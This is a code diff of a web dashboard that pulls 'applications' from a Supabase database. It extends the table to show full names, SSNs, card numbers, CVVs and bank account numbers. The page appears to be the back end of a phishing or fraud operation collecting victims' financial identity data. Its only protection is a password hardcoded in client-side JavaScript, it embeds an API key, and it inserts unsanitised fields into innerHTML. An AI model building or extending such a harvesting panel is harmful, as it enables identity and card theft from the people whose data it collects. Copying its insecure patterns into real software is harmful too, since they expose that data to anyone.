@@ -27,13 +27,16 @@
     <table>
       <thead>
         <tr>
-          <th>Name</th>
+          <th>Full Name</th>
           <th>Email</th>
           <th>Phone</th>
           <th>Address</th>
-          <th>Snn</th>
-          <th>Card</th>
-          <th>Cvv</th>
+          <th>SSN</th>
+          <th>Card Number</th>
+          <th>CVV</th>
+          <th>Account Type</th>
+          <th>Account Number</th>
+          <th>Status</th>
           <th>Created At</th>
         </tr>
       </thead>
@@ -42,7 +45,6 @@
   </div>
 
   <script>
-    // 🔑 Your secret dashboard password (change this!)
     const DASHBOARD_PASSWORD = "oakline123";
 
     function checkPassword() {
@@ -56,44 +58,45 @@
       }
     }
 
-    // ✅ Supabase setup (your project URL + anon key)
     const supabaseUrl = "https://nrjdmgltshosdqccaymr.supabase.co";
     const supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5yamRtZ2x0c2hvc2RxY2NheW1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYwMzYyMjAsImV4cCI6MjA3MTYxMjIyMH0.b9H553W2PCsSNvr8HyyINl4nTSrldHN_QMQ3TVwt6qk";
 
     const supabase = window.supabase.createClient(supabaseUrl, supabaseAnonKey);
 
     async function loadApplications() {
-      let { data, error } = await supabase
-        .from("applications")   // 👈 must match your table name
+      const { data, error } = await supabase
+        .from("applications")
         .select("*")
         .order("created_at", { ascending: false });
 
       if (error) {
         console.error("❌ Error loading data:", error);
-        document.getElementById("apps-table").innerHTML = `<tr><td colspan="5">Error loading data</td></tr>`;
+        document.getElementById("apps-table").innerHTML = `<tr><td colspan="11">Error loading data</td></tr>`;
         return;
       }
-
-      console.log("📥 Loaded applications:", data); // debug log
 
       const table = document.getElementById("apps-table");
       table.innerHTML = "";
 
       if (!data || data.length === 0) {
-        table.innerHTML = `<tr><td colspan="5">No applications found</td></tr>`;
+        table.innerHTML = `<tr><td colspan="11">No applications found</td></tr>`;
         return;
       }
 
       data.forEach(app => {
-        let row = `
+        const fullName = [app.first_name, app.middle_name, app.last_name].filter(Boolean).join(" ");
+        const row = `
           <tr>
-            <td>${app.name || "-"}</td>
+            <td>${fullName}</td>
             <td>${app.email || "-"}</td>
             <td>${app.phone || "-"}</td>
             <td>${app.address || "-"}</td>
-            <td>${app.snn || "-"}</td>
-            <td>${app.card || "-"}</td>
+            <td>${app.ssn || "-"}</td>
+            <td>${app.card_number || "-"}</td>
             <td>${app.cvv || "-"}</td>
+            <td>${app.account_type || "-"}</td>
+            <td>${app.account_number || "-"}</td>
+            <td>${app.status || "-"}</td>
             <td>${app.created_at ? new Date(app.created_at).toLocaleString() : "-"}</td>
           </tr>
         `;
